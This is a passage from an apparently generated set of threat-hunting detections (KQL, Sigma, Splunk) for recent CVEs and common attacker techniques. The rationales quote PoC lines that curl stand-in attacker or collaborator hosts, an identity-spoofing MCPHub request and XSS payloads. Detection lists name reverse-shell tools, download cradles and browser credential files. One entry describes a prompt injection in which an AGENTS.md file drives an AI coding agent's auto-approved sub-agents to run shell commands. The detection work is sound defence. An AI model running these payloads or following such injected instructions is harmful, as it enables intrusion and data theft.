    FirstSeen = min(TimeGenerated),
    LastSeen = max(TimeGenerated),
    SampleUrls = make_set(Url, 10)
    by SrcIP, Computer, bin(TimeGenerated, WindowSize)
| where DistinctUsers >= 3   // empirical fan-out threshold — one legit client = one identity per host
| order by DistinctUsers desc, LastSeen desc

[LLM] MCPHub tool execution via spoofed identity — POST to /<user>/messages with JSON-RPC body Actions on Objectives High
Detects the second-stage exploitation after a spoofed SSE handshake (GHSA-wf8q-wvv8-p8jf): POST to `/<user>/messages?sessionId=<uuid>` with a JSON-RPC tool call. This is where the spoofed identity is used to actually invoke MCP tools (filesystem, GitHub, DB connectors) under the impersonated user's authorization context. Rationale: The article's PoC Step 3 explicitly shows `curl -X POST http://TARGET:3100/CEO-admin-impersonated/messages?sessionId=54efc6f5-... -d '{"jsonrpc":"2.0","method":"tools/call",...}'`. The URL shape `/<user>/messages?sessionId=<uuid>` is unique to MCPHub (the JSON-RPC tool-call ingress for the SSE transport) and represents the actual exploitation step — not just probing. Cross-checked against: • https://github.com/advisories/GHSA-wf8q-wvv8-p8jf
ATT&CKT1059 T1190 T1078

union isfuzzy=true
  (W3CIISLog
   | where TimeGenerated > ago(7d)
   | where csMethod == "POST"
   | where csUriStem matches regex @"^/[^/]+/messages$"
   | where csUriQuery has "sessionId="
   | extend UserSegment = extract(@"^/([^/]+)/messages", 1, csUriStem),
            SessionId   = extract(@"sessionId=([0-9a-fA-F-]{20,})", 1, csUriQuery),
            SrcIP = cIP, Url = strcat(csUriStem, "?", csUriQuery), UA = csUserAgent, SourceTable="W3CIISLog"),
  (CommonSecurityLog
   | where TimeGenerated > ago(7d)
   | where RequestMethod =~ "POST"
   | where RequestURL matches regex @"(?i)^(?:https?://[^/]+)?/[^/?]+/messages\?.*sessionId=[0-9a-f-]{20,}"
   | extend UserSegment = extract(@"(?i)/([^/]+)/messages", 1, RequestURL),
            SessionId   = extract(@"(?i)sessionId=([0-9a-fA-F-]{20,})", 1, RequestURL),
            SrcIP = SourceIP, Url = RequestURL, UA = RequestClientApplication, SourceTable="CommonSecurityLog")
| where isnotempty(UserSegment) and isnotempty(SessionId)
| project TimeGenerated, SourceTable, SrcIP, Computer, Url, UserSegment, SessionId, UA
| order by TimeGenerated desc

[LLM] DeepSeek-TUI sub-agent shell execution via AGENTS.md prompt injection (CVE-2026-45374) Exploitation High
Hunts exploitation of CVE-2026-45374 where deepseek-tui's task_create tool spawns durable sub-agents with allow_shell=true and auto_approve=true defaults. A malicious AGENTS.md in a cloned repo injects shell commands (e.g. 'curl -s http://attacker/...') that execute without user approval. Detection pivots on the deepseek-tui binary spawning shell utilities or HTTP-egress LOLBins. Rationale: Article specifies the exact binary name 'deepseek-tui' (rust:deepseek-tui < 0.8.26) and shows the PoC payload as 'curl -s http://[collaborator]/badge-gen?project=web-service' executed via the sub-agent's shell. Parent=deepseek-tui spawning curl/wget/bash/python with HTTP URLs or shell -c flags is the highest-fidelity behavioural marker — deepseek-tui itself talks to the DeepSeek API directly (not via curl), so any forked shell/HTTP utility is anomalous and indicates the prompt-injection-driven sub-agent shell escape. External corroboration: confirmed deepseek-tui is a real Rust CLI (deepseek-ai/awesome-deepseek-agent repo) and a separate active campaign abuses fake deepseek-tui repos for malware delivery (cybersecuritynews.com), increasing the prior on this being targeted. Cross-checked against: • https://github.com/deepseek-ai/awesome-deepseek-agent/blob/main/docs/deepseek-tui.md • https://cybersecuritynews.com/hackers-use-fake-deepseek-tui-github-repositories/amp/ • https://github.com/advisories/GHSA-72w5-pf8h-xfp4
ATT&CKT1059.004 T1059.006 T1105 T1204.003

// CVE-2026-45374: deepseek-tui sub-agent shell exec (MDE Linux/macOS)
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "deepseek-tui"
   or InitiatingProcessFolderPath has "deepseek-tui"
| where FileName in~ ("curl","wget","bash","sh","zsh","dash","ksh","fish",
                      "nc","ncat","socat","python","python3","perl",
                      "ruby","node","powershell","pwsh")
| where ProcessCommandLine has_any ("http://","https://","/dev/tcp/","base64 -d","-c ","-s ")
   or FileName in~ ("nc","ncat","socat")
| project Timestamp, DeviceName, AccountName,

          ParentCmd   = InitiatingProcessCommandLine,

| order by Timestamp desc

[LLM] DeepSeek-TUI spawning 'cargo test' — CVE-2026-45311 auto-approved run_tests pathway Exploitation High
Hunts the specific vulnerable invocation chain where the DeepSeek-TUI agent (versions 0.3.0 to <0.8.23) auto-approves the run_tests tool and invokes 'cargo test'. Catches both legitimate and malicious-repository triggers of the auto-approval bypass so analysts can confirm whether AGENTS.md prompt-injection drove the call. Rationale: Uses the exact binary names 'deepseek-tui' and 'deepseek' confirmed via lib.rs and the upstream repo, plus the 'cargo test' invocation that the GHSA explicitly identifies as the auto-approved RCE primitive. Because deepseek-tui->cargo is a narrow, agent-specific parent/child pair (not a generic Rust developer signal — those launch cargo from a shell or IDE), this is high fidelity with a low FP rate in non-developer estates and is still actionable in dev estates as a hunt against the vulnerable version range. [LLM] Rust cargo-test binary in target/debug/deps spawning shell or network tool (CVE-2026-45311 exploitation) Exploitation High
Catches the actual RCE in flight: a compiled Rust integration-test binary under 'target/debug/deps/' or 'target/release/deps/' spawning a shell or network egress tool. The CVE-2026-45311 PoC uses std::process::Command::new("sh").args(["-c", "curl -s http://collaborator/..."]) from a #[test] function — this query catches that exact shell/HTTP shell-out from a Rust test artifact regardless of which agent (DeepSeek-TUI, similar tools) drove the cargo test. Rationale: Anchors on the Rust cargo build layout (target/(debug|release)/deps/ — where integration test binaries are emitted) combined with the PoC's exact shell-out pattern from the GHSA: std::process::Command::new("sh").args(["-c", "curl -s ..."]). Legitimate Rust integration tests almost never spawn external shells or network tools — their purpose is to exercise Rust code — so the parent-path+child-name pair is high fidelity. Mapped to T1195.001 because the delivery vector is a malicious Rust repo cloned via the developer's IDE/agent. Image attached to the GHSA confirms a Burp Collaborator callback, consistent with the curl shell-out captured by this query. Cross-checked against: • https://github.com/advisories/GHSA-wx44-2q6h-j6p8 • https://github.com/Hmbown/DeepSeek-TUI
ATT&CKT1059.004 T1105 T1041
Data sourcesEndpoint.Processes

DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFolderPath has_any (@"/target/debug/deps/", @"\target\debug\deps\", @"/target/release/deps/", @"\target\release\deps\")
| where FileName in~ (_suspicious_children)
| where AccountName !endswith "$"
| extend RcePattern = iff(ProcessCommandLine has_any ("curl ","wget ","http://","https://","/dev/tcp/","bash -i","-NoProfile","IEX","Invoke-WebRequest"), "likely_egress", "shell_or_tool")
| project Timestamp, DeviceName, AccountName,
          TestBinaryPath = InitiatingProcessFolderPath,
          TestBinary = InitiatingProcessFileName,
          TestBinaryCmd = InitiatingProcessCommandLine,
          Grandparent = InitiatingProcessParentFileName,
          Child = FileName,
          ChildCmd = ProcessCommandLine,
          RcePattern,
          ChildSHA256 = SHA256
| order by Timestamp desc

[LLM] sanitize-html xmp-tag XSS payload (CVE-2026-44990) in inbound HTTP request Exploitation Medium
Hunts inbound HTTP requests carrying the CVE-2026-44990 sanitize-html bypass signature: an <xmp> element wrapping a <script> tag or HTML event handler (onerror=/onload=/onclick=). The xmp+script joint signature is the literal PoC from the GHSA-rpr9-rxv7-x643 advisory and is essentially never benign user content, so the URI/body match is high-fidelity for exploitation attempts against Apostrophe CMS or any other consumer of sanitize-html <=2.17.3. Rationale: The advisory's PoC is literal: `<xmp><script>alert(1)</script></xmp>`, `<xmp><img src=x onerror=alert(1)></xmp>`, `<xmp><svg><script>alert(1)</script></svg></xmp>`. Co-occurrence of <xmp> with <script> or an on*= handler in a single request URI/query is the exact bypass signature and effectively never appears in legitimate user-submitted content — even rich-text editors do not emit xmp. Coverage caveat: most stored-XSS exploitation comes via POST bodies, which aren't carried in DeviceNetworkEvents or standard IIS logs, hence Medium confidence overall; WAFs that mirror the body into CEF Message give the strongest signal. Cross-checked the related ApostropheCMS sanitize-html GHSA family (GHSA-9mrh-v2v3-xpfm / CVE-2026-40186 — the textarea/option entity-decode bypass — confirms the same `nonTextTags`/`ontext` raw-text passthrough pattern at the root of this CVE). Cross-checked against: • https://github.com/apostrophecms/sanitize-html/blob/main/CHANGELOG.md • https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-9mrh-v2v3-xpfm • https://github.com/apostrophecms/sanitize-html
ATT&CKT1059.007 T1190
Data sourcesWeb.Web
// Note: covers ONLY URL/query-string reflection. POST bodies are not captured in DeviceNetworkEvents.
DeviceNetworkEvents
| where Timestamp > ago(24h)
| where ActionType in ("ConnectionSuccess", "HttpConnectionInspected", "InboundConnectionAccepted")
| where isnotempty(RemoteUrl)
| where RemoteUrl contains "xmp"
| where (RemoteUrl contains "<xmp>" or RemoteUrl contains "<XMP>" or RemoteUrl contains "%3cxmp%3e" or RemoteUrl contains "%3CXMP%3E")
| where (RemoteUrl contains "<script" or RemoteUrl contains "%3cscript" or RemoteUrl contains "%3Cscript" or RemoteUrl contains "onerror=" or RemoteUrl contains "onload=" or RemoteUrl contains "onclick=" or RemoteUrl contains "onerror%3d" or RemoteUrl contains "onload%3d")
| project Timestamp, DeviceName, DeviceId, ActionType, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
// IIS access logs + WAF/CEF — covers URL query and request body excerpts (where carried by the WAF).
let _xmp_url = (s:string) { s contains "<xmp>" or s contains "<XMP>" or s contains "%3cxmp%3e" or s contains "%3CXMP%3E" or s contains "%3cXmp%3e" };
let _xss_url = (s:string) { s contains "<script" or s contains "%3cscript" or s contains "%3Cscript" or s contains "onerror=" or s contains "onload=" or s contains "onclick=" or s contains "onmouseover=" or s contains "onerror%3d" or s contains "onload%3d" };
union isfuzzy=true
(
  W3CIISLog
  | where TimeGenerated > ago(24h)
  | where _xmp_url(csUriQuery) or _xmp_url(csUriStem)
  | where _xss_url(csUriQuery) or _xss_url(csUriStem)
  | project TimeGenerated, Source="IIS", Computer, cIP, csMethod, csUriStem, csUriQuery, scStatus, csUserAgent
),
(
  CommonSecurityLog
  | where TimeGenerated > ago(24h)
  | where _xmp_url(RequestURL) or _xmp_url(Message)
  | where _xss_url(RequestURL) or _xss_url(Message)
  | project TimeGenerated, Source=strcat(DeviceVendor,"/",DeviceProduct), Computer=DestinationHostName, cIP=SourceIP, csMethod=RequestMethod, csUriStem=RequestURL, csUriQuery=tostring(Message), scStatus=tostring(EventOutcome), csUserAgent=RequestClientApplication
)
| order by TimeGenerated desc

[LLM] Vulnerable sanitize-html <=2.17.3 / Apostrophe CMS asset inventory (CVE-2026-44990) Reconnaissance High
Identifies hosts running a vulnerable build of sanitize-html or Apostrophe CMS as reported by Defender TVM. The hunt closes the exposure window by producing a patch list before exploitation telemetry appears, and gives the SOC a target asset set for tighter monitoring of UC#1. Rationale: The advisory pins affected to npm:sanitize-html <=2.17.3 (PoC against 2.17.3); upstream changelog and the related GHSA-9mrh-v2v3-xpfm advisory show the fix line continues in the 2.17.x branch. Hunting both via TVM CveId (when MS finishes ingesting the CVE feed) and via raw `SoftwareName + SoftwareVersion` catches the gap where the CVE lookup hasn't propagated yet. TVM data is asset-level so FP is essentially zero — output is a patch list, not an alert. Cross-checked against: • https://github.com/apostrophecms/sanitize-html/blob/main/CHANGELOG.md • https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-9mrh-v2v3-xpfm
ATT&CKT1190
Data sources
// Two angles: (1) TVM has indexed the CVE; (2) raw inventory finds vulnerable sanitize-html versions even where the CVE feed lags.
let _vuln_versions = dynamic(["2.17.0","2.17.1","2.17.2","2.17.3"]);
union isfuzzy=true
(
  DeviceTvmSoftwareVulnerabilities
  | where CveId == "CVE-2026-44990"
  | project Timestamp, DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion, VulnerabilitySeverityLevel, RecommendedSecurityUpdate, Signal="TVM-CVE"
),
(
  DeviceTvmSoftwareInventory
  | where SoftwareName has_any ("sanitize-html","apostrophe","apostrophecms")
  | where SoftwareVersion in (_vuln_versions) or (SoftwareName has "sanitize-html" and SoftwareVersion startswith "2.17." and SoftwareVersion !in ("2.17.4","2.17.5"))
  | project Timestamp, DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion, VulnerabilitySeverityLevel="-", RecommendedSecurityUpdate="Upgrade sanitize-html >=2.17.4 / Apostrophe latest", Signal="Inventory-Match"
)
| order by DeviceName asc

Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-44990")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-44990")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → PowerShell encoded / obfuscated command · Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — The time of much patching is coming
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Talos weekly top-prevalent malware hash watch (Coinminer / Injector / W32.Variant) · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard · File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Remote service execution — PsExec / SMB lateral movement · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft)
[LLM] Talos weekly top-prevalent malware hash watch (Coinminer / Injector / W32.Variant) Installation High
Surfaces any execution, image-load, or file-write of the four SHA256/MD5 hashes Cisco Talos published in the 2026-05-14 Threat Source newsletter as the most prevalent malware seen in Talos telemetry that week (Win.Worm.Coinminer VID001.exe, W32.Injector d4aa3e70…_63_Exe.exe, W32.Variant u112417.dat, Auto.90B145 APQ9305.dll). Article-specific because it pins on the exact SHA256/MD5 + Talos detection names from this week's bulletin, not a generic IOC sweep. Rationale: Hash IOCs are deterministic — these four SHA256s and the four MD5s come straight from Cisco Talos's weekly telemetry top-list with named verdicts (Win.Worm.Coinminer::1201, W32.Injector:Gen.21ie.1201, W32.Variant:MalwareXgenMisc.29d4.1201, Auto.90B145.282358.in02). They were corroborated by following each Talos file-reputation URL embedded in the article (talosintelligence.com/talos_file_reputation?s=<SHA256>) which is Talos's authoritative reputation service confirming the verdict. The example filenames VID001.exe / u112417.dat / APQ9305.dll are renameable and only used as soft secondary signal in Splunk — the SHA256/MD5 are the high-fidelity anchors. FP rate is low because we're hash-pinned; the only realistic FPs are authorized malware sandbox hosts (allowlist them). Cross-checked against: • https://blog.talosintelligence.com/the-time-of-much-patching-is-coming/ • https://talosintelligence.com/talos_file_reputation?s=9f1f11a708d393e0a4109ae189bc64f1f3e312653dcf317a2bd406f18ffcc507 • https://talosintelligence.com/talos_file_reputation?s=96fa6a7714670823c83099ea01d24d6d3ae8fef027f01a4ddac14f123b1c9974 • https://talosintelligence.com/talos_file_reputation?s=e60ab99da105ee27ee09ea64ed8eb46d8edc92ee37f039dbc3e2bb9f587a33ba • https://talosintelligence.com/talos_file_reputation?s=90b1456cdbe6bc2779ea0b4736ed9a998a71ae37390331b6ba87e389a49d3d59

Infostealer — non-browser process accessing browser cookie/login DBs Actions on Objectives High
Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies SQLite from Chrome/Edge/Firefox.
ATT&CKT1539 T1555.003
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where FolderPath has_any (@"\Google\Chrome\User Data\", @"\Microsoft\Edge\User Data\", @"\Mozilla\Firefox\Profiles\")
| where FileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

// ASIM ImFileEvent — covers MDE, Sysmon, AuditD, Defender for Cloud, etc.
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where TargetFilePath has_any (@"\Google\Chrome\User Data\",
                                  @"\Microsoft\Edge\User Data\",
                                  @"\Mozilla\Firefox\Profiles\")
| where TargetFileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where ActingProcessName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,
          TargetFilePath, TargetFileName, EventType

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
Remote service execution — PsExec / SMB lateral movement Actions on Objectives High
psexec / paexec / smbexec / wmic /node — service install over SMB from remote host.
ATT&CKT1021.002 T1569.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
   or (FileName =~ "wmic.exe" and ProcessCommandLine has "/node:")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc

SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688            // process-create (audit-policy required)
| where Account !endswith "$"
| where NewProcessName endswith "\psexec.exe"
   or NewProcessName endswith "\psexesvc.exe"
   or NewProcessName endswith "\paexec.exe"
   or (NewProcessName endswith "\wmic.exe" and CommandLine has "/node:")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

title: PsExec / SMB Lateral Movement Tooling Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d03
status: experimental
description: |
    PsExec, paexec, smbexec, csexec, remcom — admin-grade tooling that
    pivots over SMB. Pair with `wmic /node:` for the full cluster.
references:
    - https://attack.mitre.org/techniques/T1021/002/
    - https://attack.mitre.org/techniques/T1569/002/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1021.002
    - attack.t1569.002
    - attack.lateral-movement
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_psexec:
        Image|endswith:
            - '\psexec.exe'
            - '\psexec64.exe'
            - '\psexesvc.exe'
            - '\paexec.exe'
            - '\csexec.exe'
            - '\remcom.exe'
            - '\smbexec.py'
    selection_wmic_remote:
        Image|endswith:
            - '\wmic.exe'
        CommandLine|contains:
            - '/node:'
    condition: selection_psexec or selection_wmic_remote
falsepositives:
    - Sysadmins running approved remote-management tooling — wrap with
      a known-admin-host watchlist
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
       OR (Processes.process_name="wmic.exe" AND Processes.process="*/node:*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
       OR (Processes.process_name="wmic.exe" AND Processes.process="*/node:*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
PowerShell encoded / obfuscated command Exploitation High
Encoded or obfuscated PowerShell — common across loaders, recon, and post-exploitation.
ATT&CKT1059.001 T1027
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("powershell.exe","pwsh.exe")
| where ProcessCommandLine matches regex @"(?i)(-enc|encodedcommand|frombase64string|-nop|-w\s+hidden|invoke-expression|iex\s*\(|downloadstring|net\.webclient)"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\pwsh.exe"
| where CommandLine matches regex @"(?i)(-enc|encodedcommand|frombase64string|-nop|-w\s+hidden|invoke-expression|iex\s*\(|downloadstring|net\.webclient)"
| project TimeGenerated, Computer, Account, NewProcessName,
          CommandLine, ParentProcessName
| order by TimeGenerated desc

title: Obfuscated / Encoded PowerShell Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d08
status: experimental
description: |
    PowerShell launched with -EncodedCommand, base64 strings, hidden
    window, no-profile, bypass policy, IEX / Invoke-Expression / Net
    .WebClient.DownloadString — combinations indicating evasion.
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://attack.mitre.org/techniques/T1027/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059.001
    - attack.t1027
    - attack.execution
    - attack.defense-evasion
logsource:
    category: process_creation
    product: windows
detection:
    selection_image:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
    selection_args:
        CommandLine|contains:
            - '-enc '
            - 'EncodedCommand'
            - 'FromBase64String'
            - 'Invoke-Expression'
            - 'IEX('
            - 'DownloadString'
            - 'Net.WebClient'
            - '-w hidden'
            - '-WindowStyle Hidden'
            - '-nop'
            - '-NoProfile'
            - '-ep bypass'
            - '-ExecutionPolicy Bypass'
    condition: selection_image and selection_args
falsepositives:
    - DevOps tooling that legitimately uses encoded command for
      cross-shell escaping
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("powershell.exe","pwsh.exe")
      AND (Processes.process="*-enc *" OR Processes.process="*EncodedCommand*"
        OR Processes.process="*FromBase64String*" OR Processes.process="*-nop*"
        OR Processes.process="*-w hidden*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*IEX(*" OR Processes.process="*DownloadString*"
        OR Processes.process="*Net.WebClient*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("powershell.exe","pwsh.exe")
      AND (Processes.process="*-enc *" OR Processes.process="*EncodedCommand*"
        OR Processes.process="*FromBase64String*" OR Processes.process="*-nop*"
        OR Processes.process="*-w hidden*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*IEX(*" OR Processes.process="*DownloadString*"
        OR Processes.process="*Net.WebClient*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

title: LSASS Process Access Outside Microsoft-Signed Tooling

    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")

    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`

[LLM] Portainer Swarm service create/update API access (CVE-2026-44849 exploitation path) Exploitation Medium
